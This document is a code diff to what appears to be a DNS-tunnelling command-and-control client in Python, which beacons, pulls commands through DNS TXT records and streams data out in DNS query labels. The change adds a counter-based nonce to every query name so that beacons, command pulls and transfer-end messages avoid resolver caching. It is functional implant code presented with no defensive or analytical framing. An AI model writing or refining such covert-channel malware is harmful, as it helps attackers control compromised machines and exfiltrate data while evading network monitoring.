@@ -32,6 +32,15 @@ BEACON_SLEEP_BASE = 4.0
 cached_stream_matrix: dict = {}
 active_transfer_name = ""
 busy = False
+_qseq = 0  # monotonic nonce so every QNAME is unique (avoids resolver cache hits)
+
+
+def _next_qnonce() -> str:
+    """Return a new label-safe nonce for outbound QNAMEs."""
+    global _qseq
+    _qseq += 1
+    return str(_qseq)
+
 
 
 def resolve_key(args) -> bytes:
@@ -142,7 +151,7 @@ def dispatch_stream(name: str, raw_data_bytes: bytes) -> None:
         time.sleep(0.01)
 
     time.sleep(0.05)
-    evaluate_server_feedback(transmit_dns_query(f"end-{wire_name}"))
+    evaluate_server_feedback(transmit_dns_query(f"end-{wire_name}.{_next_qnonce()}"))
 
 
 def evaluate_server_feedback(response_packet: bytes) -> None:
@@ -157,14 +166,15 @@ def evaluate_server_feedback(response_packet: bytes) -> None:
         if target_seq in cached_stream_matrix:
             transmit_dns_query(f"chk-{target_seq}-{cached_stream_matrix[target_seq]}")
         time.sleep(0.05)
-        evaluate_server_feedback(transmit_dns_query(f"end-{active_transfer_name}"))
+        evaluate_server_feedback(transmit_dns_query(f"end-{active_transfer_name}.{_next_qnonce()}"))
     elif cmd_str == "DONE":
         cached_stream_matrix, active_transfer_name = {}, ""
         busy = False
 
 
 def fetch_command() -> str:
-    res = transmit_dns_query("pull", qtype=16)
+    # Unique QNAME each time (server accepts pull / pull.*)
+    res = transmit_dns_query(f"pull.{_next_qnonce()}", qtype=16)
     return _txt_rdata(res).strip()
 
 
@@ -173,7 +183,8 @@ def execute_beacon_cycle() -> None:
     if busy:
         return
 
-    res = transmit_dns_query("beacon")
+    # Unique QNAME each beacon (empty payload still needs a changing label)
+    res = transmit_dns_query(f"beacon.{_next_qnonce()}")
     status = _a_rdata(res)
     if status != "PULL":
         return
